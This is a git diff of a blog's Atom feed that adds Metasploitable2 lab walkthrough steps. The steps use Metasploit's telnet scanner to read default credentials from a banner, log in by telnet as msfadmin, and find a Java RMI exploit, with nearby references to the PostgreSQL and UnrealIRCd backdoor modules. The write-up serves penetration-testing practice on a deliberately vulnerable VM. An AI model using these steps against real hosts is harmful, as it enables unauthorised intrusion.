@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-29T15:30:56-05:00</updated>
+  <updated>2016-07-05T15:40:59-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -318,6 +318,27 @@ msf exploit(postgres_payload) &gt; exploit
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
 
+<h3>TELNET exploit</h3>
+
+<p>in msfconsole, search telnet</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/telnet/telnet_version
+msf auxiliary(telnet_version) &gt; set rhosts 192.168.79.179
+msf auxiliary(telnet_version) &gt; run
+</code></pre>
+
+<p>In the banner, shows username/password</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>or you can just <code>telnet 192.168.79.179</code> to grab the banner.</p>
+
+<p>login</p>
+
+<p><code>telnet 192.168.79.179 -l msfadmin</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_026.png" title="[title manually exploit [alt text]]" ></p>
+
 <h3>SMB exploit:</h3>
 
 <p>Enumerate smtp:</p>
@@ -371,6 +392,12 @@ msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
 </code></pre>
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Java-rmi (port 1099)</h3>
+
+<p>Nmap shows port 1099 rmiregistry GNU Classpath grmiregistry</p>
+
+<p>in metasploit search rmiregistry, got one exploit</p>
 
 <h3>Mysql exploit</h3>
 
